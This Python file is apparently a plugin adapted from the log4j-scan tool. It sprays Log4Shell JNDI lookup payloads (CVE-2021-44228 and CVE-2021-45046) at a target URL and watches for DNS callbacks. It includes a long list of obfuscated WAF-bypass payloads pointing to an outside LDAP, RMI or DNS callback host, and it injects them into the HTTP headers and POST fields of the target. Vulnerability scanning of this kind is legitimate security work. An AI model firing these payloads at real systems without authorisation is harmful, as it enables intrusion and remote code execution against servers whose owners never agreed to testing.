import random
import requests
import time
from urllib import parse as urlparse
import base64
import json
from base64 import b64encode
from ClassCongregation import Dnslog,color

# 自定义的dnslog地址
custom_dns_callback_host = ''
timeout = 4
post_data_parameters = ["username", "user", "uname", "name", "email", "email_address", "password"]

# Disable SSL warnings
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

default_headers = {
    #'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*',# not being tested to allow passing through checks on Accept header in older web-servers
    'Referer': '',
    'Cookie': ''
}

waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{index}}.{{callback_host}}/{{random}}}",
                       "${${::-j}ndi:rmi://{{index}}.{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{index}}.{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{index}}.{{callback_host}}}/",
                       "${${lower:jndi}:${lower:rmi}://{{index}}.{{callback_host}}/{{random}}}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{index}}.{{callback_host}}/{{random}}}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{index}}.{{callback_host}}/{{random}}}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{index}}.{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{index}}.{{callback_host}}/{{random}}}",
                       "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{index}}.{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{index}}.{{callback_host}}}",
                       "${j${k8s:k5:-ND}i:ldap://{{index}}.{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{index}}.{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{index}}.{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{index}}.{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{index}}.{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{index}}.{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{index}}.{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{index}}.{{callback_host}}/{{random}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{index}}.{{callback_host}}/{{random}}}",
                       "${jndi:${lower:l}${lower:d}a${lower:p}://{{index}}.{{callback_host}}}",
                       "${jnd${upper:i}:ldap://{{index}}.{{callback_host}}/{{random}}}",
                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{index}}.{{callback_host}}/{{random}}}"
                       ]

cve_2021_45046 = [
                  "${jndi:ldap://127.0.0.1#{{index}}.{{callback_host}}:1389/{{random}}}",  # Source: https://twitter.com/marcioalm/status/1471740771581652995,
                  "${jndi:ldap://127.0.0.1#{{index}}.{{callback_host}}/{{random}}}",
                  "${jndi:ldap://127.1.1.1#{{index}}.{{callback_host}}/{{random}}}"
                 ]

def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    #with open(args.headers_file, "r") as f:
    #    for i in f.readlines():
    #        i = i.strip()
    #        if i == "" or i.startswith("#"):
    #            continue
    #        fuzzing_headers.update({i: payload})
    #if args.exclude_user_agent_fuzzing:
    #fuzzing_headers["User-Agent"] = default_headers["User-Agent"]

    fuzzing_headers["User-Agent"] = default_headers["User-Agent"]+payload
    fuzzing_headers["Accept"] = f'{payload}'
    fuzzing_headers["Referer"] = f'{payload}'
    fuzzing_headers["Cookie"] = f'{payload}'
    #if "Referer" in fuzzing_headers:
    #    #fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    #    fuzzing_headers["Referer"] = f'{payload}'
    return fuzzing_headers

#fuzz post参数
def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data

#生成自定义的 payload
def generate_waf_bypass_payloads(callback_host, random_string):
    payloads = []
    index = 2
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{index}}", str(index))
        new_payload = new_payload.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
        index += 1
    return payloads

#生成cve_2021_45046 payload
def get_cve_2021_45046_payloads(callback_host, random_string):
    payloads = []
    index = 25
    for i in cve_2021_45046:
        new_payload = i.replace("{{index}}", str(index))
        new_payload = new_payload.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
        index += 1
    return payloads

#解析url
def parse_url(url):
    """
    Parses the URL.
    """
    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})

#扫描url
def scan_url(url, callback_host):
    parsed_url = parse_url(url)
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
    payload = '${jndi:ldap://%s.%s/%s}' % ('1.'+parsed_url["host"], callback_host, random_string)
    payloads = [payload]
    
    #追加 waf_bypass_payloads
    payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))

    #追加 cve_2021_45046_payloads
    payloads.extend(get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))

    #print(payloads)
    #return

    for payload in payloads:
        color(f"[•] URL: {url} | PAYLOAD: {payload}", "magenta")
        
        try:
            # Get v
            requests.request(url=url,
                                method="GET",
                                params={"v": payload},
                                headers=get_fuzzing_headers(payload),
                                verify=False,
                                timeout=timeout,
                                allow_redirects=False)
        except Exception as e:
            color(f"EXCEPTION: {e}")
            continue
            
        try:
            # Post body
            requests.request(url=url,
                                method="POST",
                                params={"v": payload},
                                headers=get_fuzzing_headers(payload),
                                data=get_fuzzing_post_data(payload),
                                verify=False,
                                timeout=timeout,
                                allow_redirects=False)
        except Exception as e:
            color(f"EXCEPTION: {e}")
            continue
'''    
        try:
            # JSON body
            requests.request(url=url,
                                method="POST",
                                params={"v": payload},
                                headers=get_fuzzing_headers(payload),
                                json=get_fuzzing_post_data(payload),
                                verify=False,
                                timeout=timeout,
                                allow_redirects=False)
        except Exception as e:
            color(f"EXCEPTION: {e}")
'''       
def main(url):
    #urls = []
    if custom_dns_callback_host != '':
        color(f"[•] Using custom DNS Callback host [{custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
        dns_callback_host = custom_dns_callback_host
    else:
        dnslog = Dnslog()
        dns_callback_host = dnslog.dns_host()
        
        if dns_callback_host == 'None':
            color(f"[-] Initiating DNS callback server ({dns_callback_host}) error","red")
            return
        color(f"[•] Initiating DNS callback server ({dns_callback_host}).","blue")
        
    color("[%] Checking for Log4j RCE CVE-2021-44228.", "blue")
    #for url in urls:
    color(f"[•] URL: {url}", "blue")
    scan_url(url, dns_callback_host)
        
    if custom_dns_callback_host != '':
        color("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "blue")
        return

    color("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "blue")
    color("[•] Waiting...", "blue")
    time.sleep(int(timeout))
    
    if dnslog.result():
        color("[!!!] Targets Affected", "red")
    else:
        color("[•] Targets do not seem to be vulnerable.", "green")

def check(**kwargs):
    main(kwargs['url'])
    
    









































